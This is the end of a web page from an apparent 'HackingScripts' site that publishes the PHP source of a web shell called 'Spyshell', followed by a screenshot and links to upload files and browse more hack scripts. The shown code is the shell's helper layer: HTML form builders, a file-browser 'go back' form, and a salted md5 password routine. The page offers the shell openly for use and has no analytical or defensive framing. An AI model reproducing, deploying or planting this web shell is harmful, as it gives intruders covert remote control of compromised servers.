<span class="s2">                       p(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">option</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$key\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$value</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">                   }</span>
<span class="s2">               }</span>
<span class="s2">           }</span>
<span class="s2">       }</span>
<span class="s2">   p(&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">select</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">   if (</span><span class="si">$arg[&#39;newline&#39;]</span><span class="s2">) p(&#39;&amp;lt;/p&amp;gt;&#39;);</span>
<span class="s2">}</span>
<span class="s2">function formhead(</span><span class="si">$arg</span><span class="s2"> = array()) {</span>
<span class="s2">   global </span><span class="si">$self</span><span class="s2">;</span>
<span class="s2">   !</span><span class="si">$arg[&#39;method&#39;]</span><span class="s2"> &amp;&amp; </span><span class="si">$arg[&#39;method&#39;]</span><span class="s2"> = &#39;post&#39;;</span>
<span class="s2">   !</span><span class="si">$arg[&#39;action&#39;]</span><span class="s2"> &amp;&amp; </span><span class="si">$arg[&#39;action&#39;]</span><span class="s2"> = </span><span class="si">$self</span><span class="s2">;</span>
<span class="s2">   </span><span class="si">$arg[&#39;target&#39;]</span><span class="s2"> = </span><span class="si">$arg[&#39;target&#39;]</span><span class="s2"> ? &quot;</span><span class="nx">target</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$arg[target]</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;form1&#39;</span><span class="p">;</span>
    <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="si">$arg[action]</span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="si">$arg[method]</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$arg[target]</span><span class="s2">&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39; &amp;raquo;&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
    
<span class="k">function</span> <span class="nf">maketext</span><span class="p">(</span><span class="nv">$arg</span> <span class="o">=</span> <span class="k">array</span><span class="p">()){</span>
    <span class="o">!</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;cols&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;cols&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;rows&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;rows&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">25</span><span class="p">;</span>
    <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$arg</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br /&amp;gt;&#39;</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nx">p</span><span class="p">(</span><span class="s2">&quot;&amp;lt;p&amp;gt;</span><span class="si">$arg[title]</span><span class="s2">&amp;lt;textarea class=</span><span class="se">\&quot;</span><span class="s2">area</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="si">$arg[name]</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="si">$arg[cols]</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="si">$arg[rows]</span><span class="se">\&quot;</span><span class="s2"> </span><span class="si">$arg[extra]</span><span class="s2">&amp;gt;</span><span class="si">$arg[value]</span><span class="s2">&amp;lt;/textarea&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">formfooter</span><span class="p">(</span><span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
    <span class="o">!</span><span class="nv">$name</span> <span class="o">&amp;&amp;</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;submit&#39;</span><span class="p">;</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&amp;lt;input class=&quot;bt&quot; name=&quot;&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s1">&#39;&quot; id=&quot;&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s1">&#39;&quot; type=&quot;submit&quot; value=&quot;Submit&quot;&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">goback</span><span class="p">(){</span>
    <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">;</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;post&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;file&quot; /&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$nowpath</span><span class="o">.</span><span class="s1">&#39;&quot; /&amp;gt;&amp;lt;p&amp;gt;&amp;lt;input class=&quot;bt&quot; type=&quot;submit&quot; value=&quot;Go back...&quot;&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">formfoot</span><span class="p">(){</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">encode_pass</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">&#39;angel&#39;</span><span class="o">.</span><span class="nv">$pass</span><span class="p">);</span>
    <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="o">.</span><span class="s1">&#39;angel&#39;</span><span class="p">);</span>
    <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="s1">&#39;angel&#39;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s1">&#39;angel&#39;</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$pass</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">pr</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="o">.</span><span class="nb">print_r</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<h3>Spyshell Script screenshot<figure id="attachment_432" style="width: 604px;" class="wp-caption aligncenter"></h3>

<p><a href="/HackingScripts/wp-content/uploads/2014/02/spyshell_script.png"><img src="/HackingScripts/wp-content/uploads/2014/02/spyshell_script-1024x601.png" alt="Spyshell script screenshot" width="604" height="354" class="size-large wp-image-432" /></a><figcaption class="wp-caption-text">Spyshell script screenshot</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
